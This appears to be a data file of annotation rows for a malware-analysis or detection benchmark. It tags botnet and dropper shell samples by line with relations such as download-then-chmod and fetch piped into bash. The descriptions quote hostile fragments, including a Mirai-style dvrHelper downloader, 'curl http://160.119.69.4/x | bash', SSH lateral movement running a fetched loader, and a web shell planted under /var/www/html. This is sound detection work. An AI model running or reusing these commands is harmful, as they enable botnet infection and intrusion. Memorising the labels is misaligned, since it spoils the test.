+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	6	http-fetch	6	file-perm-set	shared	wget keeps last URL piece "i586" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	6	http-fetch	6	file-perm-set	shared	curl -O keeps last URL piece "i586" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	7	http-fetch	7	file-perm-set	shared	wget keeps last URL piece "686i" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	7	http-fetch	7	file-perm-set	shared	curl -O keeps last URL piece "686i" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "pimps" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	8	http-fetch	8	file-perm-set	shared	curl -O keeps last URL piece "pimps" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	9	http-fetch	9	file-perm-set	shared	wget keeps last URL piece "pimpsle" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	9	http-fetch	9	file-perm-set	shared	curl -O keeps last URL piece "pimpsle" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	10	http-fetch	10	file-perm-set	shared	wget keeps last URL piece "mra" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	10	http-fetch	10	file-perm-set	shared	curl -O keeps last URL piece "mra" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	11	http-fetch	11	file-perm-set	shared	wget keeps last URL piece "mra5" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	11	http-fetch	11	file-perm-set	shared	curl -O keeps last URL piece "mra5" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	12	http-fetch	12	file-perm-set	shared	wget keeps last URL piece "mra6" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	12	http-fetch	12	file-perm-set	shared	curl -O keeps last URL piece "mra6" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	13	http-fetch	13	file-perm-set	shared	wget keeps last URL piece "mra7" (line 13); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	13	http-fetch	13	file-perm-set	shared	curl -O keeps last URL piece "mra7" (line 13); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	14	http-fetch	14	file-perm-set	shared	wget keeps last URL piece "68x" (line 14); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	14	http-fetch	14	file-perm-set	shared	curl -O keeps last URL piece "68x" (line 14); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	15	http-fetch	15	file-perm-set	shared	wget keeps last URL piece "ppc" (line 15); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	15	http-fetch	15	file-perm-set	shared	curl -O keeps last URL piece "ppc" (line 15); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	16	http-fetch	16	file-perm-set	shared	wget keeps last URL piece "m68k" (line 16); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	16	http-fetch	16	file-perm-set	shared	curl -O keeps last URL piece "m68k" (line 16); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	17	http-fetch	17	file-perm-set	shared	wget keeps last URL piece "4sh" (line 17); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	17	http-fetch	17	file-perm-set	shared	curl -O keeps last URL piece "4sh" (line 17); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	3	http-fetch	3	file-perm-set	shared	wget keeps last URL piece "Space.arc" (line 3); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	4	http-fetch	4	file-perm-set	shared	curl -O keeps last URL piece "Space.arc" (line 4); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	5	net-connect	5	file-perm-set	shared	tftp get "Space.arc" (line 5); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	6	net-connect	6	file-perm-set	shared	tftp get "Space.arc" (line 6); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "Space.arm" (line 8); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	9	http-fetch	9	file-perm-set	shared	curl -O keeps last URL piece "Space.arm" (line 9); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	10	net-connect	10	file-perm-set	shared	tftp get "Space.arm" (line 10); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	11	net-connect	11	file-perm-set	shared	tftp get "Space.arm" (line 11); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	13	http-fetch	13	file-perm-set	shared	wget keeps last URL piece "Space.arm5" (line 13); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	14	http-fetch	14	file-perm-set	shared	curl -O keeps last URL piece "Space.arm5" (line 14); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	15	net-connect	15	file-perm-set	shared	tftp get "Space.arm5" (line 15); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	16	net-connect	16	file-perm-set	shared	tftp get "Space.arm5" (line 16); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	18	http-fetch	18	file-perm-set	shared	wget keeps last URL piece "Space.arm6" (line 18); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	19	http-fetch	19	file-perm-set	shared	curl -O keeps last URL piece "Space.arm6" (line 19); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	20	net-connect	20	file-perm-set	shared	tftp get "Space.arm6" (line 20); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	21	net-connect	21	file-perm-set	shared	tftp get "Space.arm6" (line 21); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	23	http-fetch	23	file-perm-set	shared	wget keeps last URL piece "Space.arm7" (line 23); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	24	http-fetch	24	file-perm-set	shared	curl -O keeps last URL piece "Space.arm7" (line 24); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	25	net-connect	25	file-perm-set	shared	tftp get "Space.arm7" (line 25); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	26	net-connect	26	file-perm-set	shared	tftp get "Space.arm7" (line 26); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	28	http-fetch	28	file-perm-set	shared	wget keeps last URL piece "Space.i686" (line 28); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	29	http-fetch	29	file-perm-set	shared	curl -O keeps last URL piece "Space.i686" (line 29); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	30	net-connect	30	file-perm-set	shared	tftp get "Space.i686" (line 30); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	31	net-connect	31	file-perm-set	shared	tftp get "Space.i686" (line 31); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	33	http-fetch	33	file-perm-set	shared	wget keeps last URL piece "Space.m68k" (line 33); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	34	http-fetch	34	file-perm-set	shared	curl -O keeps last URL piece "Space.m68k" (line 34); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	35	net-connect	35	file-perm-set	shared	tftp get "Space.m68k" (line 35); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	36	net-connect	36	file-perm-set	shared	tftp get "Space.m68k" (line 36); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	38	http-fetch	38	file-perm-set	shared	wget keeps last URL piece "Space.mips" (line 38); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	39	http-fetch	39	file-perm-set	shared	curl -O keeps last URL piece "Space.mips" (line 39); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	40	net-connect	40	file-perm-set	shared	tftp get "Space.mips" (line 40); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	41	net-connect	41	file-perm-set	shared	tftp get "Space.mips" (line 41); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	43	http-fetch	43	file-perm-set	shared	wget keeps last URL piece "Space.mpsl" (line 43); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	44	http-fetch	44	file-perm-set	shared	curl -O keeps last URL piece "Space.mpsl" (line 44); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	45	net-connect	45	file-perm-set	shared	tftp get "Space.mpsl" (line 45); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	46	net-connect	46	file-perm-set	shared	tftp get "Space.mpsl" (line 46); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	48	http-fetch	48	file-perm-set	shared	wget keeps last URL piece "Space.ppc" (line 48); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	49	http-fetch	49	file-perm-set	shared	curl -O keeps last URL piece "Space.ppc" (line 49); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	50	net-connect	50	file-perm-set	shared	tftp get "Space.ppc" (line 50); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	51	net-connect	51	file-perm-set	shared	tftp get "Space.ppc" (line 51); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	53	http-fetch	53	file-perm-set	shared	wget keeps last URL piece "Space.sh4" (line 53); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	54	http-fetch	54	file-perm-set	shared	curl -O keeps last URL piece "Space.sh4" (line 54); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	55	net-connect	55	file-perm-set	shared	tftp get "Space.sh4" (line 55); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	56	net-connect	56	file-perm-set	shared	tftp get "Space.sh4" (line 56); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	58	http-fetch	58	file-perm-set	shared	wget keeps last URL piece "Space.spc" (line 58); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	59	http-fetch	59	file-perm-set	shared	curl -O keeps last URL piece "Space.spc" (line 59); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	60	net-connect	60	file-perm-set	shared	tftp get "Space.spc" (line 60); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	61	net-connect	61	file-perm-set	shared	tftp get "Space.spc" (line 61); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	63	http-fetch	63	file-perm-set	shared	wget keeps last URL piece "Space.x86" (line 63); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	64	http-fetch	64	file-perm-set	shared	curl -O keeps last URL piece "Space.x86" (line 64); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	65	net-connect	65	file-perm-set	shared	tftp get "Space.x86" (line 65); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	66	net-connect	66	file-perm-set	shared	tftp get "Space.x86" (line 66); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	68	http-fetch	68	file-perm-set	shared	wget keeps last URL piece "Space.x86_64" (line 68); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	69	http-fetch	69	file-perm-set	shared	curl -O keeps last URL piece "Space.x86_64" (line 69); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	70	net-connect	70	file-perm-set	shared	tftp get "Space.x86_64" (line 70); chmod names it
+/mnt/games/kofsurvey/sc_fam/f709	71	net-connect	71	file-perm-set	shared	tftp get "Space.x86_64" (line 71); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	1	http-fetch	1	file-perm-set	shared	wget keeps last URL piece "aarch64" (line 1); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	2	http-fetch	2	file-perm-set	shared	wget keeps last URL piece "armv4l" (line 2); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	3	http-fetch	3	file-perm-set	shared	wget keeps last URL piece "armv5l" (line 3); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	4	http-fetch	4	file-perm-set	shared	wget keeps last URL piece "armv6l" (line 4); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	5	http-fetch	5	file-perm-set	shared	wget keeps last URL piece "armv7l" (line 5); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	6	http-fetch	6	file-perm-set	shared	wget keeps last URL piece "m68k" (line 6); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	7	http-fetch	7	file-perm-set	shared	wget keeps last URL piece "mips64" (line 7); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "mips64l" (line 8); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	9	http-fetch	9	file-perm-set	shared	wget keeps last URL piece "mips64b" (line 9); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	10	http-fetch	10	file-perm-set	shared	wget keeps last URL piece "ppc" (line 10); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	11	http-fetch	11	file-perm-set	shared	wget keeps last URL piece "sh4" (line 11); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	12	http-fetch	12	file-perm-set	shared	wget keeps last URL piece "mips" (line 12); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	13	http-fetch	13	file-perm-set	shared	wget keeps last URL piece "mpsl" (line 13); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	14	http-fetch	14	file-perm-set	shared	wget keeps last URL piece "x86_64" (line 14); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	15	http-fetch	15	file-perm-set	shared	wget keeps last URL piece "x86" (line 15); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	16	http-fetch	16	file-perm-set	shared	wget keeps last URL piece "xtensa" (line 16); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	17	http-fetch	17	file-perm-set	shared	wget keeps last URL piece "sparc" (line 17); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	19	http-fetch	19	file-perm-set	shared	wget keeps last URL piece "aarch64" (line 19); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	20	http-fetch	20	file-perm-set	shared	wget keeps last URL piece "armv4l" (line 20); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	21	http-fetch	21	file-perm-set	shared	wget keeps last URL piece "armv5l" (line 21); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	22	http-fetch	22	file-perm-set	shared	wget keeps last URL piece "armv6l" (line 22); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	23	http-fetch	23	file-perm-set	shared	wget keeps last URL piece "armv7l" (line 23); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	24	http-fetch	24	file-perm-set	shared	wget keeps last URL piece "m68k" (line 24); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	25	http-fetch	25	file-perm-set	shared	wget keeps last URL piece "mips64" (line 25); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	26	http-fetch	26	file-perm-set	shared	wget keeps last URL piece "mips64l" (line 26); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	27	http-fetch	27	file-perm-set	shared	wget keeps last URL piece "mips64b" (line 27); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	28	http-fetch	28	file-perm-set	shared	wget keeps last URL piece "ppc" (line 28); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	29	http-fetch	29	file-perm-set	shared	wget keeps last URL piece "sh4" (line 29); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	30	http-fetch	30	file-perm-set	shared	wget keeps last URL piece "mips" (line 30); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	31	http-fetch	31	file-perm-set	shared	wget keeps last URL piece "mpsl" (line 31); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	32	http-fetch	32	file-perm-set	shared	wget keeps last URL piece "x86_64" (line 32); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	33	http-fetch	33	file-perm-set	shared	wget keeps last URL piece "x86" (line 33); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	34	http-fetch	34	file-perm-set	shared	wget keeps last URL piece "xtensa" (line 34); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	35	http-fetch	35	file-perm-set	shared	wget keeps last URL piece "sparc" (line 35); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	37	http-fetch	37	file-perm-set	shared	wget keeps last URL piece "aarch64" (line 37); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	38	http-fetch	38	file-perm-set	shared	wget keeps last URL piece "armv4l" (line 38); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	39	http-fetch	39	file-perm-set	shared	wget keeps last URL piece "armv5l" (line 39); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	40	http-fetch	40	file-perm-set	shared	wget keeps last URL piece "armv6l" (line 40); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	41	http-fetch	41	file-perm-set	shared	wget keeps last URL piece "armv7l" (line 41); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	42	http-fetch	42	file-perm-set	shared	wget keeps last URL piece "m68k" (line 42); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	43	http-fetch	43	file-perm-set	shared	wget keeps last URL piece "mips64" (line 43); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	44	http-fetch	44	file-perm-set	shared	wget keeps last URL piece "mips64l" (line 44); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	45	http-fetch	45	file-perm-set	shared	wget keeps last URL piece "mips64b" (line 45); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	46	http-fetch	46	file-perm-set	shared	wget keeps last URL piece "ppc" (line 46); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	47	http-fetch	47	file-perm-set	shared	wget keeps last URL piece "sh4" (line 47); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	48	http-fetch	48	file-perm-set	shared	wget keeps last URL piece "mips" (line 48); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	49	http-fetch	49	file-perm-set	shared	wget keeps last URL piece "mpsl" (line 49); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	50	http-fetch	50	file-perm-set	shared	wget keeps last URL piece "x86_64" (line 50); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	51	http-fetch	51	file-perm-set	shared	wget keeps last URL piece "x86" (line 51); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	52	http-fetch	52	file-perm-set	shared	wget keeps last URL piece "xtensa" (line 52); chmod names it
+/mnt/games/kofsurvey/sc_fam/f422	53	http-fetch	53	file-perm-set	shared	wget keeps last URL piece "sparc" (line 53); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0009_c.sh	0	-	0	-	none	curl without -O writes to stdout; chmod names files nothing produced; ./name not a node
+/mnt/games/normtest/wire_b/corp/smp/sh/0036_mirai.sh	7	http-fetch	8	file-perm-set	shared	wget -O dvrHelper (7); chmod 777 dvrHelper (8)
+/mnt/games/normtest/wire_b/corp/smp/sh/0061_build.sh	2	http-fetch	2	file-perm-set	shared	wget -O a (line 2); chmod 777 a
+/mnt/games/normtest/wire_b/corp/smp/sh/0061_build.sh	2	file-perm-set	2	proc-start	shared	chmod 777 a; sh a (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0061_build.sh	2	http-fetch	2	proc-start	shared	wget -O a; sh a runs the downloaded file (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0024_build.sh	2	http-fetch	2	file-perm-set	shared	wget -O a (line 2); chmod 777 a
+/mnt/games/normtest/wire_b/corp/smp/sh/0024_build.sh	2	file-perm-set	2	proc-start	shared	chmod 777 a; sh a (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0024_build.sh	2	http-fetch	2	proc-start	shared	wget -O a; sh a runs the downloaded file (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0026_build.sh	2	http-fetch	2	file-perm-set	shared	wget -O a (line 2); chmod 777 a
+/mnt/games/normtest/wire_b/corp/smp/sh/0026_build.sh	2	file-perm-set	2	proc-start	shared	chmod 777 a; sh a (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0026_build.sh	2	http-fetch	2	proc-start	shared	wget -O a; sh a runs the downloaded file (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0035_build.sh	2	http-fetch	2	file-perm-set	shared	wget -O a (line 2); chmod 777 a
+/mnt/games/normtest/wire_b/corp/smp/sh/0035_build.sh	2	file-perm-set	2	proc-start	shared	chmod 777 a; sh a (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0035_build.sh	2	http-fetch	2	proc-start	shared	wget -O a; sh a runs the downloaded file (line 2)
+/mnt/games/normtest/wire_b/corp/smp/sh/0029_build.sh	32	http-fetch	32	file-perm-set	shared	wget -O a (line 32); chmod 777 a
+/mnt/games/normtest/wire_b/corp/smp/sh/0029_build.sh	32	file-perm-set	32	proc-start	shared	chmod 777 a; sh a (line 32)
+/mnt/games/normtest/wire_b/corp/smp/sh/0029_build.sh	32	http-fetch	32	proc-start	shared	wget -O a; sh a runs the downloaded file (line 32)
+/mnt/games/normtest/wire_b/corp/smp/sh/0039_build.sh	14	http-fetch	14	file-perm-set	shared	wget -O a (line 14); chmod 777 a
+/mnt/games/normtest/wire_b/corp/smp/sh/0039_build.sh	14	file-perm-set	14	proc-start	shared	chmod 777 a; sh a (line 14)
+/mnt/games/normtest/wire_b/corp/smp/sh/0039_build.sh	14	http-fetch	14	proc-start	shared	wget -O a; sh a runs the downloaded file (line 14)
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	4	data-decode	88	data-call	must	mainurl=$(echo ..|base64 -d) (4) used in ${CURL_CMD}/${WGET_CMD} URL (88); callee is a variable
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	88	data-call	88	proc-start	must	pipe: fetch of ${mainurl}/d/*.sh into bash (88)
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	4	data-decode	91	data-call	must	mainurl=$(echo ..|base64 -d) (4) used in ${CURL_CMD}/${WGET_CMD} URL (91); callee is a variable
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	91	data-call	91	proc-start	must	pipe: fetch of ${mainurl}/d/*.sh into bash (91)
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	4	data-decode	98	data-call	must	mainurl=$(echo ..|base64 -d) (4) used in ${CURL_CMD}/${WGET_CMD} URL (98); callee is a variable
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	98	data-call	98	proc-start	must	pipe: fetch of ${mainurl}/d/*.sh into bash (98)
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	4	data-decode	101	data-call	must	mainurl=$(echo ..|base64 -d) (4) used in ${CURL_CMD}/${WGET_CMD} URL (101); callee is a variable
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	101	data-call	101	proc-start	must	pipe: fetch of ${mainurl}/d/*.sh into bash (101)
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	93	file-perm-set	93	proc-start	shared	chmod +x /tmp/arcc.sh; bash /tmp/arcc.sh (93)
+/mnt/games/normtest/wire_b/corp/smp/sh/0010_cronb.sh	103	file-perm-set	103	proc-start	shared	chmod +x /tmp/ai.sh; bash /tmp/ai.sh (103)
+/mnt/games/normtest/wire_b/corp/smp/sh/0014_lr.sh	81	http-fetch	83	file-perm-set	shared	curl -o /tmp/.mimu/kthmimu (81); chmod +x same path (83)
+/mnt/games/normtest/wire_b/corp/smp/sh/0014_lr.sh	82	http-fetch	84	file-perm-set	shared	curl -o /tmp/.mimu/apache.sh (82); chmod +x same path (84)
+/mnt/games/normtest/wire_b/corp/smp/sh/0014_lr.sh	82	http-fetch	85	proc-background	shared	curl -o /tmp/.mimu/apache.sh (82); nohup /tmp/.mimu/apache.sh (85)
+/mnt/games/normtest/wire_b/corp/smp/sh/0014_lr.sh	84	file-perm-set	85	proc-background	shared	chmod +x /tmp/.mimu/apache.sh (84); nohup same path (85)
+/mnt/games/normtest/wire_b/corp/smp/sh/0015_ldr.sh	6	http-fetch	7	file-perm-set	may	in function get: curl/wget output redirected to $2 (6), chmod +x $2 (7)
+/mnt/games/normtest/wire_b/corp/smp/sh/0015_ldr.sh	115	http-fetch	115	proc-start	must	pipe: curl uninstall.sh | bash (115)
+/mnt/games/normtest/wire_b/corp/smp/sh/0015_ldr.sh	116	http-fetch	116	proc-start	must	pipe: curl quartz_uninstall.sh | bash (116)
+/mnt/games/normtest/wire_b/corp/smp/sh/0015_ldr.sh	170	file-perm-set	171	net-connect	must	chmod +r/400 $key (170); ssh -i $key (171), same loop
+/mnt/games/normtest/wire_b/corp/smp/sh/0015_ldr.sh	171	http-fetch	171	proc-start	may	inside quoted ssh remote command "(curl $cc/ldr.sh||wget -O- $cc/ldr.sh)|sh" (171)
+/mnt/games/normtest/wire_b/corp/smp/sh/0021_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0023_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0025_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0027_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0030_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0032_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0040_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0051_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0056_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0059_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0111_cros.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/normtest/wire_b/corp/smp/sh/0033_build.sh	0	-	0	-	none	build script/tarball fetch; no table-node relation (tar, ./upx, go, gcc not nodes; wget only downloads archives; large padded lines are strip)
+/mnt/games/kofsurvey/sc_fam/f613	490	http-fetch	493	proc-start	may	curl -so "$DR/.wu.new" "$u" (490), sh "$DR/.wu.new" (493); same variable path, 72KB file only partly read
+/mnt/games/kofsurvey/sc_fam/f613	490	http-fetch	492	proc-start	may	curl -so "$DR/.wu.new" (490), sh -n "$DR/.wu.new" (492)
+/mnt/games/kofsurvey/sc_fam/f613	1059	data-decode	1059	data-call	must	pipe: xxd -r -p | $NC_BIN -w3 $i 61616 (1059), dynamic callee
+/mnt/games/kofsurvey/sc_fam/f1	35	http-fetch	35	proc-start	must	pipe: curl noroot.php | sh (35)
+/mnt/games/kofsurvey/sc_fam/f1	37	http-fetch	37	proc-start	must	pipe: curl noroot.php | sh (37)
+/mnt/games/kofsurvey/sc_fam/f1	36	data-decode	36	proc-start	shared	base64 -d > /tmp/tryRoot1.sh then bash /tmp/tryRoot1.sh (36)
+/mnt/games/kofsurvey/sc_fam/f1	2	data-decode	29	file-perm-set	shared	base64 -d | tee .. > /var/www/html/admin/views/some.php (2); chmod +x same path (29)
+/mnt/games/kofsurvey/sc_fam/f100	35	http-fetch	35	proc-start	must	pipe: curl noroot.php | sh (35)
+/mnt/games/kofsurvey/sc_fam/f100	37	http-fetch	37	proc-start	must	pipe: curl noroot.php | sh (37)
+/mnt/games/kofsurvey/sc_fam/f100	36	data-decode	36	proc-start	shared	base64 -d > /tmp/tryRoot1.sh then bash /tmp/tryRoot1.sh (36)
+/mnt/games/kofsurvey/sc_fam/f100	2	data-decode	29	file-perm-set	shared	base64 -d | tee .. > /var/www/html/admin/views/some.php (2); chmod +x same path (29)
+/mnt/games/kofsurvey/sc_fam/f1000	2	http-fetch	2	proc-start	must	pipe: curl http://160.119.69.4/x | bash (2)
+/mnt/games/kofsurvey/sc_fam/f1000	5	data-decode	5	proc-start	must	pipe: echo b64 | base64 -d | bash (5)
+/mnt/games/kofsurvey/sc_fam/f1000	6	data-decode	6	proc-start	must	pipe: echo b64 | base64 -d | bash (6)
+/mnt/games/kofsurvey/sc_fam/f1000	9	data-decode	9	proc-start	must	pipe: echo b64 | base64 -d | bash (9)
+/mnt/games/kofsurvey/sc_fam/f1000	10	data-decode	10	proc-start	must	pipe: echo b64 | base64 -d | bash (10)
